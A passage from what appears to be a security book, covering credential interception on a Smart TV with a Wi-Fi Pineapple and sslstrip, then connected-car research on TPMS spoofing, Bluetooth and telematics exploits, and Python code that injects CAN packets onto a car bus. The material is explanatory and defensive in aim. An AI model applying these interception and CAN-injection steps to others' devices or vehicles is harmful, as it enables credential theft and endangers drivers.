Trying 31.13.76.102...
Connected to star.c10r.facebook.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.facebook.com
HTTP/1.1 302 Found
Location: https://www.facebook.com/
Content-Type: text/html; charset=utf-8
Date: Tue, 09 Dec 2014 04:46:59 GMT
Connection: close
Content-Length: 0
Connection closed by foreign host.
Ah, so the browser is then redirected to the secure TLS encrypted version of the website
and the user logs in. The sslstrip tool intercepts this redirect and never sends the
browser any link starting with https. It also proxies the requests between the server, i.e.
it connects to the destination (facebook.com) using TLS. To be able to do this, we require
sslstrip to be on a device that is between the victim and the target destination. And
this is exactly the situation we have in our case: The Smart TV is connected to the
Pineapple and we have full control over the Pineapple.
Inspecting Your Own Smart TV (and other IoT devices) 
| 
175

The intention of this section is to show how to setup the Pineapple
and begin to do preliminary eavesdropping on the Smart TV net‐
work traffic so we have willingly connected the Smart TV to a de‐
vice such as the Pineapple. However, someone within physical vicin‐
ity of the Smart TV may also be able to use the Pineapple to broad‐
cast a “fake” wireless network with the same name as the network the
TV is configured to connect to. This can fool the TV into connect‐
ing to the Pineapple instead of the legitimate access point. This can
be done using the built-in “Karma” tool. Instructions available on‐
line detail how to do this.
Let’s enable sslstrip on the Pineapple. From the main section, click on “Pineapple Bar”
and select the “Pineapple Bar: Available” tab. Click “Show” next to the “User Infusions”
section. You should see a list of “Infusions” populate (these are extensions created by
other users to supplement the functionality of the Pineapple). Click on “Install” on the
right hand of the “sslstrip” entry. Click on “Install to internal storage”. Now go back to
the main section and you should see a new box for sslstrip (Figure 5-11).
Figure 5-11. sslstrip is installed on the Pineapple
Click on “Start” and then click on the link titled "sslstrip" to see the output. On the
Smart TV, open up the web browser (most Smart TVs come with a default web browser;
see your TV’s instructions) and browse to http://gmail.com. Enter “blah” for the email
address and password and click on “Sign in”. Of course, the login attempt will fail but
notice the address bar of the browser; the URL is still in the form of http (Figure 5-12).
Try the same on a laptop that is not on the “Trust_Me” network and you will be redirected
to a https link. This means that sslstrip worked.
176 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Figure 5-12. Login attempt on Smart TV
On your Linux laptop, you should see the actual captured credentials in the “Output”
section of sslstrip (Figure 5-13).
Inspecting Your Own Smart TV (and other IoT devices) 
| 
177

Figure 5-13. Captured credentials
To protect from sslstrip, servers can enable HTTP Strict Trans‐
port Security (HSTS). This will make the server issue a HTTP head‐
er with the string “Strict-Transport-Security”. When the browser sees
this, it will remember to make sure to always connect using TLS when
connecting to the domain that issued the header. The drawback of
this is that if sslstrip is running for the first time, the browser won’t
know that it must use TLS and the attacker can prevent the header
from being passed along. As a result some browsers (example:
Chrome and Firefox) have included some well known domains in a
“Preload List” instructing the browser to always connect to those
domains using TLS.
The Pineapple is a useful device for testing IoT objects that connect to the network.
Check out the various additional “infusions” available for free. For example, you can
use the dnsspoof to send the TV any IP address when it looks up the location of a
particular server (for example you send 192.168.1.1 where you have a local web server
installed instead of one of Google’s real IP address when the TV looks up google.com).
In a paper titled “Smart TV Hacking”, Nikos Sidiropoulos and Periklis Stefopoulos
found that their Samsung Smart TV connected to a web server at
az43064.vo.msecnd.net to download the firmware update. They setup a local server
on their laptop with the same firmware file and manually created an entry for
az43064.vo.msecnd.net to point to their laptop’s IP address to see if the Smart TV
178 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

would download the firmware from their laptop instead. It did. This was an interesting
test to see if the TV contained any static entries for trusted servers (it didn’t). If you were
to come across a condition such as this, you can easily test this scenario using the
dnsspoof infusion on the Pineapple in case there is no direct access to the TV’s file
system (to be able to create a static entry).
You can also easily capture all network traffic using the tcpdump infusion (and view it
using the Wireshark tool). This can be used to test various functionalities of applications
and reverse engineer their design. And this isn’t just limited to Smart TV’s. Test other
IoT devices you have access to and see what you find. Have fun!
Conclusion
In the scope of our discussion, we learnt that Smart TVs are full-blown Linux machines.
These devices are increasingly hopping on the wireless networks in homes and offices
where we rely on them to be secure. Smart TV manufacturers also want to make sure
these devices cannot be tampered with to protect their business. SamSung is one of the
most popular Smart TV manufacturers, and as this chapter has shown, they’ve had a
bad start.
In the world of traditional application security, we’ve learnt the basics of applying en‐
cryption the right way, including basic principles such as taking care to perform input
validation. We’ve learnt to be careful of web-based design by making sure cross origin
policies are strictly enforced. Within most schools of developers, how to implement
such basic security is common knowledge. However, manufacturers like SamSung have
not applied due diligence to security. This has resulted in millions of TVs sold by Sam‐
Sung that are connected to the Internet and are possibly vulnerable to attacks (a lot of
Smart TVs have auto update functionality enabled and this helps the situation, but
attackers who’ve managed their way in are likely to disable auto updates). This situation
can be abused by attackers to use the Smart TVs to launch attacks on other devices on
the local network (and also on external third-party targets).
Attackers can also leverage this to gain access to video cameras connected to the TVs
thereby violating the privacy of families. But it’s not just the attackers; privacy also
depends upon how the system is designed. In an article titled “I’m terrified of my new
TV”, author Michal Price talks of the voice recognition feature in his Smart TV which
comes with this warning in the legal agreement: “Please be aware that if your spoken
words include personal or other sensitive information, that information will be among
the data captured and transmitted to a third party”. In other words, the voice collected
by the TV’s microphone is processed in an external server on the Internet. This means
that the actual spoken audio is accessible by a third party. Apple’s Siri also works this
way. Some families and corporations may feel uneasy about enabling a feature like this,
however many people are not aware that this is happening behind the scenes. Further‐
more, it is unclear what the service provider is doing to make sure the audio captured
Conclusion 
| 
179

on their servers is kept secure from intruders. The point here is that Smart TV manu‐
facturers need to be clear and upfront of their intentions and provide evidence of due
diligence so users are aware and can make their own choices.
The cyber security profession is thriving with researchers (such as the ones presented
in this chapter) who are finding and reporting security issues, which is putting pressure
on Smart TV providers to secure their platforms. Increased awareness of customers on
potential risks and the options available to them will further assist in a positive way. Our
TVs, still the most popular glass slabs around us, aren’t going anywhere anytime soon.
We are going to see more Smart TVs around us in the next few years. We will enjoy all
the new features they bring with them. With push in the right direction on part of the
manufacturers and consumers, we hope to take our journey into the glass slab future
as securely as possible.
180 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

CHAPTER 6
Connected Car Security Analysis: From Gas
to Fully Electric
In 2014, a Sierra Leone doctor in Nebraska and a Liberian visitor in Dallas died of the
deadly disease, Ebola. This caused a media frenzy in the United States and made a lot
of citizens concerned about contracting the disease, even though one is more likely to
die of their pajamas catching fire than from Ebola. Pajamas side, we do have a tendency
to underestimate and overestimate things that may kill us. Cancer and heart disease are
known to be the leading causes of death, yet our attention often focuses on improbable
scenarios such as dying in an airplane crash. The numbers speak otherwise: There is a
1 in 11 million chances of being killed in a plane crash. Yet our chances of being killed
in a car crash is 1 in 5,000 and most of us get into a car on a daily basis without giving
it a second thought.
Car accidents can be a result of distracted driving, speeding, drunk driving, bad weather,
running red lights, car defects, unsafe lane changes, improper turns, tailgating, road
rage, bad roads, tire blowouts, fog, and animal crossings. Most people reading this book
either have been in a minor or major car accident or know someone who has.
Despite the risks posed by cars and driving, society gains tremendous benefits from
people having personal transport vehicles. Individuals in cities that lack a good public
transport infrastructure depend on having a car to get to work and back home and to
run errands. From the 12 day traffic jam in China in 2010 to the 2.5 million car and 48
hour traffic jam in Houston consisting of people attempting to flee the city from an
oncoming hurricane, we have seen clear evidence that many cities around the world
would come to a halt should the personal vehicle infrastructure be disrupted.
The issue of pollution and the negative effects on our climate is unquestionable which
has led to the public promotion and understanding of the importance of hybrid cars
such as the Toyota Prius, and the Tesla Model S, which is fully electric. Owning a car
181

may be a luxury to some, a matter of livelihood to others, and a matter of concern for
the climate to the collective human race.
In the past few years, cars have started to become increasingly connected to serve their
drivers and passengers. Safety and entertainment related features that rely on wireless
communications are not only becoming popular but expected by new car buyers. Cars
are also increasingly catering to reducing emissions to comply with regulations and
appease customers who are genuinely concerned for the environment (and those who
want to save gas money).
In this chapter we will take a look at what it means for car to be a thing that is accessible
and controllable remotely. Unlike many other devices, the interconnectedness of the car
can serve important safety function, yet security vulnerability can lead to the loss of
lives. We will first examine a low-range wireless system, and then review the extensive
research performed by leading experts in academia. Lastly, we will analyze and discuss
features that can be found in the Tesla Model S sedan including possible ways the security
of the car can be improved.
Tire Pressure Monitoring System (TPMS)
The Ford Explorer was first put on sale in March 1990. It is alleged that Ford engineers
recommended changes to the design of the car because it rolled over in tests before mass
production. These cars were equipped with tired manufactured by Firestone. The
Firestone-equipped Explorers ultimately caused accidents involving 174 deaths and
more than 700 injuries; in response, Firestone recalled its tires. This resulted in a blame
game where Ford was accused of releasing a product with known safety issues, while
Ford accused Firestone of manufacturing defective tires (the defect involved “tread
separation,” which caused the tires to disintegrate, resulting in decreased stability of the
vehicle).
This controversy resulted in the federal law enacted in 2000 called The Transportation
Recall Enhancement, Accountability and Document (TREAD) act. The act mandated
the use of a suitable Tire Pressure Monitoring System (TPMS). TPMS is a system de‐
signed to monitor the state of the air pressure inside the tires and report any issues—
such as low tire pressure—to the driver.
The Ford/Firestone situation caused more than a hundred deaths. From that, we can
easily extrapolate the high number of deaths that are caused on a daily basis by faulty
tire pressure. So clearly, well-designed TPMS systems are extremely important. The
system should be able to report low tire pressure to the driver, and the system should
not be vulnerable to other actors who could, for example, influence the system to show
a low-tire pressure warning when in fact the tire pressures are in the correct range.
Otherwise, highway robbers within the vicinity of a car could make the driver stop in a
remote area by activating the low-pressure warning. Researchers from University of
182 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

South Carolina performed an in-depth analysis of TPMS and found security design
flaws that can be exploited. In this section, we will take a look at their research to un‐
derstand TPMS and what issues were uncovered. Since TPMS relies on very basic wire‐
less communication mechanisms, it is the appropriate first topic to cover as we learn
about the security of connected cars.
The TPMS measure the tire pressure inside all of the tires on a vehicle and alerts the
driver of loss of tire pressure. Two different types of TPMS exist: direct and indirect
measurement systems. The direct measurement system uses battery-powered pressure
sensors inside each tire to monitor the pressure. Since it is difficult to place wire around
rotating tires, Radio Frequency (RF) transmitters are used instead. The sensors com‐
municate using RF and send data to a receiving tire-pressure control unit, which collects
information from all the tire sensors. When a sensor reports that a tire is running low
on air pressure, the control unit sends information using the Controller Area Network
(CAN) to trigger a warning message on the car’s dashboard. Indirect measurement
systems, on the other hand, infer pressure differences by leveraging the Anti-locking
Breaking System (ABS) sensors. ABS can help detect when a tire is rotating faster than
the other tires, which is the case when a tire loses pressure. However, this method is less
accurate and cannot account for cases when all the tires lose pressure. As of 2008, all
cars in the US are required to employ direct TPMS.
Cars are full of Electronic Control Units (ECUs) which use the CAN specifications to
communicate. ECUs are mini-computers that control various aspects of the car. All
ECUs in the car are connected to two wires running along the body of the car (CAN-
High and CAN-Low). ECUs transmit information by raising and dropping voltages on
the wires. Since all ECUs are connected to the same wires, data transmitted by an ECU
is available to all other ECUs on the network. The collection of ECUS communicating
using the CAN standard is known as the “CANbus”.
The TPMS architecture consists of a set of components. The TPMS sensors are fitted
onto the tires that periodically broadcast the pressure and temperature measurements.
The sensors activate when the speed of the car is higher than 40km/h or when it receives
an RF activational signal that is used during installation to get the sensors to transmit
their IDs. A RF receiving unit that is part of the TPMS system remembers the sensor
IDs so that it can filter out communication from sensors of nearby cars. There is also a
TPMS ECU installed in the car as well, as four antennas that are connected to the RF
receiving unit. The low-pressure warning light is also part of the TPMS system. As the
sensors routinely broadcast the pressure and temperature measurements, the receiving
unit collects the packets and first makes sure they don’t belong to neighboring cars
(based on the ID). If any of the sensors transmits a reading that indicates low tire pres‐
sure, the system then displays a warning light.
Tire Pressure Monitoring System (TPMS) 
| 
183

Reversing TPMS Communication
The researchers from the University of South Carolina attempted to analyze the pro‐
prietary protocol used between the sensors and the receiving unit. As we will see in this
section, their approach and analysis is unique because they manipulated the temperature
around the sensors to reverse engineer the protocol. This type of mindset is critical as
it illustrates creativity on part of security researchers. This type of approach can also be
employed by malicious entities to reverse engineer communication, so it is important
that the design of communication protocols and supporting architecture is secure.
Based on a collection of marketing materials, the researchers learnt that TPMS com‐
munication occurs in the 315 MHz and 433 MHZ bands (known as Ultra High Fre‐
quency, or UHF, designated to be between the ranges of 300 MHz and 3 GHz) and uses
Amplitude Shift Keying (ASK) or FSK (Frequency Shift Keying) modulation. Modula‐
tion is basically the way we facilitate communication over any given medium, such as
air or over a wire. Take for instance our ability to transmit our vocal communications
through a medium such as radio. The process of converting our voice to a radio signal
so that it can be sent wirelessly is called modulation. A carrier wave (often just called
“carrier”) is a waveform that is modulated to transmit communications wirelessly. In
the case of ASK, the amplitude of the wave is changed to a fixed value when a binary
symbol of 1 is communicated; the carrier signal is turned off to transmit a binary value
of 0. In the case of FSK, the frequency of the carrier signal is changed to a fixed value
to represent a 1 or a 0. There are various tutorials available online that discuss the topic
of modulation in more detail.
The researchers did not disclose the exact manufacturers of the two different types of
the sensors they focused on, instead referring to them as “Pressure Sensor A” (TPS-A)
and “Pressure Sensor B” (TPS-B). They used the ATEQ VT55 TPMS trigger tool
(Figure 6-1) to trigger the sensors so that they transmit data.
184 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Figure 6-1. The ATEQ VT55 TPMS trigger tool
The TVRX daughterboard (Figure 6-2) attached to a USRP (Universal Software Radio
Peripheral) allowed the research team to capture TPMS communications. The advan‐
tage of software-defined radios is that, wherever possible, they strive to implement fea‐
tures in software rather than hardware, making it less expensive for tinkerers to analyze
radio communications.
Figure 6-2. The TVRX daughterboard
Tire Pressure Monitoring System (TPMS) 
| 
185

Data from USRP was analyzed using the GNU Radio, an open source software that can
be used to process the captured signals.
As the research team analyzed the data transmitted by the sensors, they guessed that a
technique known as Manchester Encoding was being applied. They were able to confirm
this after applying the algorithm to decode Manchester encoded data, which resulted
in a stream of information containing a known Sensor ID. This is an important mindset
in the art of reversing a given architecture, i.e. looking for a known tuple of data (Sensor
ID, in this case) and using it to see if the proper decoding algorithm has been applied.
Although Manchester encoding is not a form of encryption, this technique of looking
for a known tuple to see if the analysis is on the right track is similar to the idea of a
known-plaintext attack in the field of cryptography, where an attacker has a copy of
both the encrypted text and the plain text, and is able to use this information to infer
weaknesses or secrecy embedded in the algorithm.
Next, the research team manipulated the sensors by heating the tires with hot guns and
cooling them with refrigerators. Then they looked at which bits within the communi‐
cation changed. They also adjusted the air pressure in the tires. This is another unique
and critical step to remember when dealing with IoT devices. In the world of software,
the idea of influencing the environment around a physical object is not applicable, but
it is definitely within scope of the methodology of testing IoT devices that contain sen‐
sors which collect information about the physical world. Using this technique, the re‐
searchers were further able to decode the stream of communication from the sensors
to pinpoint which bits referred to temperature data.
Eavesdropping and Privacy Implications
The data transmitted by the tire sensors is not encrypted, allowing someone in the
vicinity of a car equipped with TPMS to capture the information. The researchers found
they were able to eavesdrop on sensor data from up to 40 meters away in cases where
the target car was stationary.
From the viewpoint of privacy, one risk is that a tracking system deployed alongside
roads can be used to track particular cars around the city to capture drivers’ whereabouts
based on their Sensor IDs. The feasibility of this is low since sensors only transmit data
every 60 seconds. However, the researchers proposed that a tracking system could po‐
tentially leverage the fact that sensors respond to an activational signal (at 125 kHz).
This means that one could implant a device that would issue the activational signal to
trigger the transmission by the sensor. Based on the average speed limit around the area,
wireless capture devices could be placed at appropriate distances to capture the data
transmitted by the sensors. In this way, one could cheaply deploy a system for tracking
cars at various spots within a given city.
The gravity of this example stems from the fact that millions of cars have TPMS and so
are transmitting sensor data that can be captured by individuals or devices in the vicinity.
186 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Not only that, most people who own TPMS enabled cars have no idea that their cars are
transmitting this information. Furthermore, there is no easy way for an average car
owner to turn the system off, even though most individuals will want to leave the system
on since they’re more concerned about dangerously low tire pressure than about being
tracked.
What makes this research interesting is that it encourages us to pause and reflect on
how we are going to design interconnected devices in the future. The lesson here is that
over-the-air communication of potentially trackable data can compromise the privacy
of consumers, especially in cases where the platform is implemented in millions of
devices whose shelf life is measured in decades. Furthermore, device manufacturers
must do a better job of informing their customers what information is being transmitted
and what it could mean to their privacy.
Spoofing Alerts
Another type of scenario the Unversity of South Carolina researchers contemplated is
one where an attacker could potentially spoof wireless network data to trigger alerts in
the victim’s car. The researchers found that they could craft spoofed network packets
transmitted from the front left tire of the attacker’s car that would trigger an alert in the
car on its right. The assumption here is that the attacker would have to know the Sensor
ID of one of the tires of the victim’s car. However, this can easily be obtained by issuing
an activational signal. It was found that the spoofed packets were picked up by the
victim’s car as far as 38 meters away and could trigger the car’s low pressure warning
light.
During the analysis, the researchers attempted to transmit as many as 40 spoofed packets
per second and found this arose no suspicion on the receiving unit or the TPMS ECU,
even though the expected frequency of a sensor packet is once every 60 seconds. The
researchers also uncovered that the warning light would go on and off at “random”
intervals when forged packets with different pressure rates were transmitted at the rate
of 40 packets per second.
Another peculiar thing uncovered during testing was the fact that, when a spoofed
packet was transmitted, the victim’s car’s TPMS ECU did not immediately turn on the
warning signal but instead sent out two activational signals that caused the victim’s car’s
sensors to respond. However, even though these responses from the legitimate sensors
contained normal readings, the ECU still flashed the warning signal based on the orig‐
inal spoofed packet transmitted prior to the two activation signals. Not only did this
ultimately make the attack successful, but this situation also opens up the victim’s car
to a battery drain attack: A neighboring car can drain the victim car’s sensor batteries
by sending a spoofed packet that causes the victim’s car to transmit two activation pack‐
ets, in turn causing each of the car’s sensors to send response packets.
Tire Pressure Monitoring System (TPMS) 
| 
187

After two weeks of experiments, the researchers inadvertently caused the test car’s TPMS
ECU to crash, completely disabling the TPMS service. They were not able to revive the
unit and ultimately had to buy a brand new ECU at the car dealership. This illustrates
that the manufacturer of the ECU did not invest time into implementing resiliency
against unexpected events and malicious spoofed packets.
This case is yet another example of how security needs to be designed into the product
at the earliest stages. In software, we’ve learnt that we need to employ security principles
during use case design, architecture design, development, testing, and post-production.
In the case of the test units, it’s clear that the manufacturers did not take security into
account in most, if not all, phases of product development.
As we continue to head towards a world full of inter-connected vehicles, we ought to
demand more effort into the implementation of security and privacy related controls.
Without this requirement, we are going to continue to put our privacy and physical
safety at risk.
Exploiting wireless connectivity
As we’ve seen so far, ECUs communicating on the CANBus make up the connected car.
We’ve looked at the design of the TPMS ECU, but there are many other ECUs that are
popular and critical to the secure functioning of the car. Researchers Charlie Miller and
Chris Valasek have explained the functionalities of many ECUs in their papers titled A
Survey of Remote Automative Attack Surfaces and Adventures in Automotive Networks
and Control Units. Although some of the news coverage of their work dismissed the
impact of their findings because their demonstrations assumed physical access to the
car, their analysis of various ECUs and the CANBus ecosystem of cars is quite useful.
Furthermore, researchers at the University of San Diego and the University of Wash‐
ington have already demonstrated that it’s possible to remotely gain access to a car by
exploiting short-range and long-range wireless networks. This research, coupled with
Miller and Valasek’s analysis, leads us to ponder scenarios that may allow malicious
entities to remotely compromise and control targeted cars by exploiting wireless net‐
works used by the car, and then levering their understandings of how each ECU works.
In this section we will couple the ideas presented by both research teams to further our
understanding of attack surfaces targeting Bluetooth and cellular networks in cars.
Injecting CAN Data
Miller and Valasek have done a fantastic job of explaining the structure of CAN data. It
is crucial we understand how the CAN packets are structured so we have a solid concept
of how these packets are constructed and computed by various ECUs.
Here is a sample packet from a Ford Escape:
IDH: 03, IDL: B1, Len: 08, Data: 80 00 00 00 00 00 00 00
188 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

In this packet, the CAN ID transmitted is 03B1 (a concatenation of the ID-High and
ID-low values). Each ECU that receives the CAN packet decides whether to process the
packet or ignore it depending upon how it is programmed to recognize the CAN ID of
the packet. The next byte represents the size of the data portion of the packet, which in
this case is 8.
Here is an example of a CAN packet transmitted by a Toyota:
IDH: 00, IDL: B6, Len: 04, Data: 33 A8 00 95
In the case of Toyota, it was found that the last byte represented a checksum value
computed by the following algorithm:
Checksum = (IDH + IDL + Len + Sum(Data[0] – Data[Len-2])) & 0xFF
For simplicity, here are the values of our packet in decimal:
0xB6 = 182
0x04 = 4
0x33 = 51
0xA8 = 168
Adding it all up, we have 182 + 4 + 51 +168 = 405 which in binary is represented as:
0000 0001 1001 0101
The value of 0xFF in decimal is 255 and here is the binary value:
0000 0000 1111 1111
Here is the resulting binary if we were to perform an AND operation between the two:
0000 0000 1001 0101
The value of the result in decimal is 149, which computes to a hexadecimal represen‐
tation of 0x95. This is exactly the value of the last byte in our example packet, so we’ve
confirmed that our understanding of Toyota’s checksum works.
Miller and Valasek used the ECOM Cable to capture the CANBus traffic and analyze it
on their laptop. This cable doesn’t directly connect using the OBD2 interface found is
most cars, so the researchers purchased an OBD2 adapter to rectify this. The advantage
of this setup is the availability of the ECOM Developer’s API, which can be used to
program and automate the capture and injection of CAN Data. The researchers wrote
their own suite of tools using this API to assist in security evaluation of CAN packets.
The project is called ecomcat_api and it is free to download.
Here is an example of Python code usually required to initialize tolls written using the
project:
from ctypes import *
   import time
   mydll = CDLL('Debug\\ecomcat_api')
   class SFFMessage(Structure):
Exploiting wireless connectivity 
| 
189

       _fields_ = [("IDH", c_ubyte),
                   ("IDL", c_ubyte),
                   ("data", c_ubyte * 8),
                   ("options", c_ubyte),
                   ("DataLength", c_ubyte),
                   ("TimeStamp", c_uint),
                   ("baud", c_ubyte)]
Next, we initialize the connection to the ECOM cable:
handle = mydll.open_device(1,0)
According to the researchers, 1 represents a high speed CAN network and 0 represents
that the first connected cable is being used.
Next, it is possible to inject a CAN packet onto the CANBus:
y = pointer(SFFMessage())
    mydll.DbgLineToSFF("IDH: 02, IDL: 30, Len: 08, Data: A1 00 00 00 00 00
   5D 30", y)
mydll.PrintSFF(y, 0)
mydll.write_message_cont(handle, y, 1000)
mydll.close_device(handle)
This will transmit the packet continuously for 1000ms.
That’s how easy it is to send a CAN packet on a CANBus network. For more details on
how to use this tool to test and inject various types of CAN packets, please read the
whitepaper about it.
Now that we understand how easy it is to inject CAN packets, let’s take a look at possible
ways to remotely gain access to the CAN. As we have seen in this section, once we have
access to the CAN, it’s easy to inject data. This gives us good perspective of the high
probability of potential abuse once an attacker has compromised an ECU that is on the
CANBus.
Bluetooth Vulnerabilities
Miller and Valasek’s paper on the survey of automotive attack surfaces states: “Right
now the authors of this paper consider Bluetooth to be one of the biggest and most
viable attack surfaces on the modern automobile, due to the complexity of the protocol
and underlying data. Additionally, Bluetooth has become ubiquitous within the auto‐
motive spectrum, giving attackers a very reliable entry point to test”.
In the 2010 Ford Escape analyzed by Miller and Valasek, the Bluetooth functionality
was the Accessory Protocol Interface Module (APIM) module also known as the “Ford
SYNC Computer”. The researchers found that one has explicitly press a button in the
car to put it into “pairing mode” in order for it to connect with and trust a particular
smart-phone. The car displays a 6 digit PIN that must be entered on the smart-phone
for the pairing to take place. However, the research performed by the University of San
190 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Diego and the University of Michigan have asserted that they have found scenarios to
exploit Bluetooth through “indirect” and “direct” wireless attacks.
The University of San Diego researchers discovered various buffer-overflow attacks
after reverse-engineering the Bluetooth firmware from the car they used for their ex‐
periment (their paper does not mention the model or the manufacturer). Buffer over‐
flow attacks can be used to over-run the victim computer’s memory with injected code
thus allowing the attacker full control of the computer. The researchers did not disclose
the exact code they were able to exploit, but they indicated they were able to abuse
improper implementation of the strcpy function which is a very common avenue lead‐
ing to buffer overflow attacks.
Prior to exploiting the buffer overflow condition, an attacker first needs to pair a ma‐
licious smart phone to the car using bluetooth. The researchers explained that this could
be done in two ways: indirect and direct. In indirect mode, the attacker assumes access
to a phone owned by the driver of the car that has already been paired with the Bluetooth
system. This scenario would work when the attacker has temporary physical access to
the smart-phone, but it is not necessary. A more plausible scenario is that the attacker
can lure the driver of the car to download an app that has been infected. There have
been many cases where malicious apps have slipped past the scrutiny of famous app
store platforms such as the Android App store, so we have evidence that attackers have
been able to make their apps available for download on these platforms. The researchers
claim that once the driver with a smartphone that has been paired to the Bluetooth
system is lured to download and launch the malicious app, the buffer overflow condition
can be exploited to take over the ECU responsible for handling the Bluetooth func‐
tionality.
In the case of direct mode, the researchers portray a scenario where an attacker who is
within the vicinity of the car can sniff the car. To pair a new device with the car, the user
normally has to explicitly enable “pairing mode”. When the driver does this, the car
displays a 6 digit PIN that the user has to enter on the smart phone. However, the
researchers found that the car they were analyzing would pair with new devices even
when pairing mode was not requested. However, the car would not display the PIN so
the researchers suggested a brute force scenario where an attacker would try all possible
combinations (0-999999). The researchers noted that they were able to brute-force and
guess the PIN in an average of 10 hours. Once the attacker’s device is paired, the attacker
can launch the malicious app on his or her own paired smart-phone that would exploit
the known buffer over-flow condition and take over the ECU. The researchers ac‐
knowledged that 10 hours is a long time for the attack to be feasible because the car
would have to be running. They presented a scenario where a potential attacker in a
parking garage could parallelize this attack vector and simultaneously target multiple
cars in a crowded garage to increase his or her odds.
Exploiting wireless connectivity 
| 
191

Vulnerabilities in Telematics
Many cars contain cellular radio equipment that is used to connect the car to a cellular
network. One popular example of this is General Motor’s OnStar which provides many
features to the drivers and passengers, including contacting call centers during an
emergency. As part of this service, the system can also track the car’s location and relay
it to the call centers during an accident so that assistance can be automatically dis‐
patched. The system also provides features such as stolen vehicle tracking, and even
allows the call centers to remotely slow down a stolen vehicle. The computer responsible
for handling this cellular communication is known as the Telematics ECU. Figure 6-3
illustrates the Telematics ECU for the 2010 Toyota Prius as found in the whitepaper
written by Miller and Valasek.
Figure 6-3. The Telematics ECU for the 2010 Toyota Prius
Miller and Valasek state the following opinion on Telematics ECUs: “This is the holy
grail of automotive attacks since the range is quite broad (i.e. as long as the car can have
cellular communications). Even though a telematics unit may not reside directly on the
CAN bus, it does have the ability to remotely transfer data/voice, via the microphone,
to another location. Researchers previously remotely exploited a telematics unit of an
automobile without user interaction”.
192 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

A successful attack against the telematics system would indeed be the most impactful
since the scenario allows for attackers to remotely break into cars from anywhere in the
world given that many of the telematics system have an actual cellular phone number
that can receive incoming connections. The researchers from the University of San
Diego and the University of Washington claim to have successfully exploited a telematics
system powered by Airbiquity’s aqLink software. This software allows for the trans‐
mission of critical data through channels normally reserved for voice communication.
This is useful because wireless networks intended for voice communication such as
GSM and CDMA are have greater coverage areas than networks such as 3G.
On a similar note, researchers Mathew Solnik and Don Bailey found
a way to exploit Short Messaging System (SMS) to remotely unlock a
Subaru Outback and even start the car. Their presentation, titled “War
Texting” is available for download.
The researchers were able to find the actual phone number assigned to the car and called
it to listen to the initiation tone. Since aqLink uses the audio channel to transmit digital
data, this was the first step employed by the researchers to reverse engineer the protocol.
The whitepaper does not discuss the actual exploit code utilized, but the researchers
claim to have found various buffer overflow conditions in the implementation of aqLink.
They devised an exploit that took 14 seconds to transmit, however it was found that the
car’s telematics unit would terminate the call after 12 seconds upon receiving the call.
To get around this limitation, they found another flaw in the authentication algorithm
of aqLink, which is responsible for authenticating incoming calls to make sure they are
from a legitimate source. The researchers found that the car would initiate an “authen‐
tication challenge” upon receiving the call. In the simplest terms, this means that the
car expects the caller, if legitimate, to be able to know a shared cryptographic secret that
is used to respond with the correct answer to the challenge. In most cases a random
token, i.e. a “nonce”, is used to make sure that the same challenge is not issued. It was
found that the car would user the same nonce sequence when turned off and on again.
This created a situation where the researchers could capture a legitimate response to
the challenge and resend it to a car that has just been turned on (also known as a “replay
attack”). Furthermore, it was found that the car would accept an incorrect response once
every 256 times. Therefore, the researchers were able to authenticate with the car by
repeatedly calling and bypassing authentication at the average rate of 128 calls.
Once authenticated, the researchers were able to change the timeout from 12 seconds
to 60 seconds and then re-call the car to deliver the buffer overflow exploit discovered
earlier. In this way, the researchers demonstrated they could remotely call the cars and
take over the telematics ECU. Since the ECU is on the CANBus, they were further able
Exploiting wireless connectivity 
| 
193

to influence additional aspects of the car, such as flashing the TPMS ECU with custom
code to trigger rogue notification packets.
Significant Attack Surface
The ability to surreptitiously take control of a car’s telematics ECU presents an attack
surface whose implications are profound. Once the attacker is able to compromise an
ECU, he or she can then compromise other ECUs and inject fake packets that can cause
the car to slow down, speed up, come to a halt, or unlock its doors. Of course, the scenario
would differ because of the difference in architecture between different cars. Some
manufacturers may hard-wire functionality that is outside of the realm of the CANBus
while others may rely upon the notion that every packet on the CANBus may be trusted.
A crucial point to note here is the scenario where an attacker may abuse remotely ex‐
ploitable conditions en masse, i.e. attempt to exploit as many cars as possible. Such a
brute-force attack may yield greater fruit for the attacker because every successful at‐
tempt would result in unlocking the car and transmittal of the car’s current GPS coor‐
dinates. Imagine a situation where an attacker has been able to gain control of hundreds
or even thousands of cars in this way. Demented individuals, malicious activists, or even
terrorists with malicious intent could remotely compromise the safety of drivers in
moving vehicles to get attention or to obtain media coverage at the potential cost of
injuries to innocent drivers.
The case for alarm regarding physical safety is clear and real. Consider also the risk to
privacy. Attackers can easily track compromised cars and possibly listen in on private
conversations of executives, business competitors, or politicians to obtain and abuse
corporate and personal data. It is easy to imagine how this can be automated and even
targeted towards certain individuals or corporations depending upon their location.
We have learnt to detect anomalies in our computing environment to figure out if sus‐
picious activity warrants our attention. This can be done simply by looking for network
port scanning activity or correlating various log sources such as email, anti-virus, host
intrusion detection systems, and others to obtain greater intelligence. No such approach
is seen on popular vehicles that allow short and long range communication such as
Bluetooth and cellular. For example, Miller and Valasek state the following in their
paper:
“Besides just replaying CAN packets, it is also possible to overload the CAN network,
causing a denial of service on the CAN bus. Without too much difficulty, you can make
it to where no CAN messages can be delivered. In this state, different ECUs act differently.
In the Ford, the PSCM ECU completely shuts down. This causes it to no longer provide
assistance when steering. The wheel becomes difficult to move and will not move more
than around 45% no matter how hard you try. This means a vehicle attacked in this way
can no longer make sharp turns but can only make gradual turns”.
194 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

A denial of service attack is one of the easiest issues to detect given the noise the attack
generates that includes excessive amounts of network traffic. The car should be able to
notcie a flood of CAN packets and realize that suspicious activity is taking place. Cars
should employ a fallback scenario when this occurs to guarantee the safety of the driver
and passengers.
Furthermore, it is clear that much of the ECU software looked at by researchers contains
basic software flaws such as buffer overflow vulnerabilities, relying on obscurity, and
bad implementation of cryptography (reoccurring nonce). This makes it clear that the
